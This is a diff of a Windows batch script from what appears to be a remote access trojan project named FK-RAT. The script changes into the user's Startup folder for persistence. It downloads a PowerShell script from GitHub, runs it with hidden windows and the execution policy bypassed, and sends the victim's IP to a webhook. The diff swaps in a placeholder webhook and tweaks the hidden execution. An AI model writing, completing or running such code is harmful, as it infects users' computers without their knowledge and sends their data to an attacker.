@@ -6,7 +6,7 @@
 @REM variables
 set "INITIALPATH=%cd%"
 set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
-set "WEBHOOK=https://github.com/Sunnickel/FK-RAT/raw/main/resources/webhook.ps1"
+set "WEBHOOK=YOUR_WEBHOOK_LINK"
 
 @REM move into Startup Dir
 cd "%STARTUP%"
@@ -19,7 +19,7 @@ powershell ./wget.cmd
 
 @REM Send IP to Webhook
 powershell powershell.exe -windowstyle hidden -c "Invoke-WebRequest -URI https://github.com/Sunnickel/FK-RAT/raw/main/resources/webhook.ps1 -OutFile webhook.ps1";
-powershell -ep bypass -command ./webhook.ps1 sendInfection %WEBHOOK%
+powershell -ep bypass -windowstyle hidden  -command "./webhook.ps1 -Webhook \"%WEBHOOK%""
 
 @REM cd change back to initial location
 cd "%INITIALPATH%"
